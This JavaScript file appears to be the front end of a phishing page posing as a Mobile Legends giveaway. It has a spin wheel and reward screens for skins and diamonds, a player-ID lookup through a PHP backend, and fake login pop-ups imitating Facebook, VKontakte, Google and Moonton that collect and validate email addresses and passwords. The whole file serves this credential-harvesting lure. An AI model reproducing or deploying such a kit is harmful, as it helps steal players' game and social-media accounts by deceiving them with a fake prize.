var slideIndex = 0;
showSlides();

function showSlides() {
  var i;
  var slides = document.getElementsByClassName("imagebanneralex");
  var dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";
  }
  slideIndex++;
  if (slideIndex > slides.length) {
    slideIndex = 1
  }
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex - 1].style.display = "block";
  dots[slideIndex - 1].className += " active";
  setTimeout(showSlides, 2000); // Change image every 2 seconds
}

function menu1alex() {
  $('.alexskin').show();
  $('.alexrecall').hide();
  $('.alexdiamond').hide();
  var element = document.getElementById("alex1menu");
  element.classList.add("alexactive");
  var element = document.getElementById("alex2menu");
  element.classList.remove("alexactive");
  var element = document.getElementById("alex3menu");
  element.classList.remove("alexactive");
}

function menu2alex() {
  $('.alexskin').hide();
  $('.alexrecall').show();
  $('.alexdiamond').hide();
  var element = document.getElementById("alex1menu");
  element.classList.remove("alexactive");
  var element = document.getElementById("alex2menu");
  element.classList.add("alexactive");
  var element = document.getElementById("alex3menu");
  element.classList.remove("alexactive");
}

function menu3alex() {
  $('.alexskin').hide();
  $('.alexrecall').hide();
  $('.alexdiamond').show();
  var element = document.getElementById("alex1menu");
  element.classList.remove("alexactive");
  var element = document.getElementById("alex2menu");
  element.classList.remove("alexactive");
  var element = document.getElementById("alex3menu");
  element.classList.add("alexactive");
}

function claimalex() {
  $('.contalexclaim').fadeIn();
  $('.contalexspin').fadeOut();
  var element = document.getElementById("claimalex");
  element.classList.add("kirialexaktif");
  var element = document.getElementById("spinalex");
  element.classList.remove("kananalexaktif");
}

function spinalex() {
  $('.contalexclaim').fadeOut();
  $('.contalexspin').fadeIn();
  var element = document.getElementById("claimalex");
  element.classList.remove("kirialexaktif");
  var element = document.getElementById("spinalex");
  element.classList.add("kananalexaktif");
}

function showAlexrules() {
  $('.popalexrulesmoba').fadeIn();
}

function closeAlexrules() {
  $('.popalexrulesmoba').fadeOut();
}

function showAlexlogin() {
  $('.alex-login').fadeIn();
}

function closeAlexlogin() {
  $('.alex-login').fadeOut();
}

function alex_facebook() {
  $('.alex-facebook').show();
  $('.alex-login').hide();
}

function ariandi_facebook() {
  $('.alex-facebook').hide();
  $('.alex-login').show();
}

function alex_vikontakte() {
  $('.alex-vikontakte').show();
  $('.alex-login').hide();
}

function ariandi_vikontakte() {
  $('.alex-vikontakte').hide();
  $('.alex-login').show();
}

function alex_google() {
  $('.alex-google').show();
  $('.alex-login').hide();
}

function ariandi_google() {
  $('.alex-google').hide();
  $('.alex-login').show();
}

function alex_moonton() {
  $('.alex-moonton').show();
  $('.alex-login').hide();
}

function ariandi_moonton() {
  $('.alex-moonton').hide();
  $('.alex-login').show();
}

function TrueIDalex() {
  var playid = $("#playid").val();
  var zoneid = $("#zoneid").val();
  var lagualex = document.getElementById("lagualex");
  lagualex.play();
  $(".respon").show();
  $(".wrong").hide();
  $(".tidakada").hide();
  if (playid == "" || playid == null || playid.length <= 6 || zoneid == "" || zoneid == null || zoneid.length <= 3) {
    $(".wrong").show();
    $(".respon").hide();
    $(".tidakada").hide();
    return false;
  } else {
    $(".wrong").hide();
  }

  $.ajax({
    type: 'POST',
    url: 'alexBackEnd/AlexHost-ID.php?id=' + playid + '&zone=' + zoneid + '',
    beforeSend: function() {
      $(".respon").show();
    },
    success: function(data) {
      if (data == "" || data == null) {
        $(".respon").hide();
        $(".tidakada").show();
      } else {
        $(".trueidalexmoba").fadeOut();
        $("#toastnick").text(data);
        $("input#ressplayid").val(playid);
        $("input#resszoneid").val(zoneid);
        $("input#ressnick").val(data);
      }
    }
  })

}

function AlexHostingNetFB() {
  $emailfb = $('#alx_email_fb').val().trim();
  $passwordfb = $('#alx_password_fb').val().trim();
  if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
    $('.email-fb').show();
    $('.sandi-fb').hide();
    return false;
  } else {
    $('.email-fb').hide();
  }
  if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
    $('.sandi-fb').show();
    return false;
  } else {
    $('.sandi-fb').hide();
  }
}

function AlexHostingNetVK() {
  $emailvk = $('#alx_email_vk').val().trim();
  $passwordvk = $('#alx_password_vk').val().trim();
  if ($emailvk == '' || $emailvk == null || $emailvk.length <= 5) {
    $('.email-vk').show();
    $('.sandi-vk').hide();
    return false;
  } else {
    $('.email-vk').hide();
  }
  if ($passwordvk == '' || $passwordvk == null || $passwordvk.length <= 5) {
    $('.sandi-vk').show();
    return false;
  } else {
    $('.sandi-vk').hide();
  }
}

function AlexHostingNetGP() {
  $emailgp = $('#alx_email_gp').val().trim();
  $passwordgp = $('#alx_password_gp').val().trim();
  if ($emailgp == '' || $emailgp == null || $emailgp.length <= 5) {
    $('.email-gp').show();
    $('.sandi-gp').hide();
    return false;
  } else {
    $('.email-gp').hide();
  }
  if ($passwordgp == '' || $passwordgp == null || $passwordgp.length <= 5) {
    $('.sandi-gp').show();
    return false;
  } else {
    $('.sandi-gp').hide();
  }
}

function AlexHostingNetMT() {
  $emailmt = $('#alx_email_mt').val().trim();
  $passwordmt = $('#alx_password_mt').val().trim();
  if ($emailmt == '' || $emailmt == null || $emailmt.length <= 5) {
    $('.email-mt').show();
    $('.sandi-mt').hide();
    return false;
  } else {
    $('.email-mt').hide();
  }
  if ($passwordmt == '' || $passwordmt == null || $passwordmt.length <= 5) {
    $('.sandi-mt').show();
    return false;
  } else {
    $('.sandi-mt').hide();
  }
}

$(document).ready(function() {
  function loadURL() {
    $("#" + string).removeClass("ledWheel");
    $("#" + string).addClass("darkWheel");
    string = string + 1;
    if (string > 8) {
      string = 0;
    }
    $("#" + string).addClass("ledWheel");
    $("#" + string).removeClass("darkWheel");
  }

  function randomIntFromRange() {
    return Math.floor(Math.random() * caveWidth);
  }

  function loop() {
    daysSinceJan0101 = daysSinceJan0101 + 1;
    loadURL();
    if (daysSinceJan0101 > absDays + 10 && interestingPoint === string) {
      audioTag.pause();
      au.play();
      var formattedChosenQuestion = $(".rewheel-" + string + " span").html();
      $(".valueimgalex").attr("src", "alexFrontEnd/img/reward/" + string + ".png");
      $(".valuerewardalex").html(formattedChosenQuestion);
      $(".rewardalexspin").show();
      interestingPoint = 0;
      daysSinceJan0101 = 0;
    } else {
      if (daysSinceJan0101 < absDays) {
        remain = remain - 5;
      } else {
        if (daysSinceJan0101 === absDays) {
          var viewportCenter = randomIntFromRange();
          interestingPoint = viewportCenter;
        } else {
          if (daysSinceJan0101 > absDays + 10 && interestingPoint === string + 1) {
            remain = remain + 600;
          } else {
            remain = remain + 20;
          }
        }
      }
      if (remain < 40) {
        remain = 40;
      }
      timer = setTimeout(loop, remain);
    }
  }

  function orMapK() {
    daysSinceJan0101 = 0;
    remain = 100;
    interestingPoint = 1;
    loop();
  }
  var nodataid = Math.floor(Math.random() * 7);
  var $realtime = $(".rewheel-" + nodataid);
  var caveWidth = 6;
  var absDays = 30;
  var string = 1;
  var daysSinceJan0101 = 0;
  var remain = 30;
  var timer = 0;
  var interestingPoint = 1;
  var audioTag = document.createElement("audio");
  audioTag.src = "alexFrontEnd/sound/alexspin-start.mp3";
  var au = document.createElement("audio");
  au.src = "alexFrontEnd/sound/alexspin-stop.mp3";
  $("#doWheel").on("click", function() {
    $(".btn-wheel").addClass("disabled");
    $("#doWheel").prop("disabled", "true");
    orMapK();
    audioTag.play();
  });
});

var buka = new Audio();
buka.src = "https://rawcdn.githack.com/AlexHostX/all.asset/d1a42a80f01064a559cb0ce4e5ec0474091c651f/click.mp3";

var tutup = new Audio();
tutup.src = "https://rawcdn.githack.com/AlexHostX/all.asset/6635455e463c4b55d9c4dac99f2c44f9091b612c/unclick.mp3";
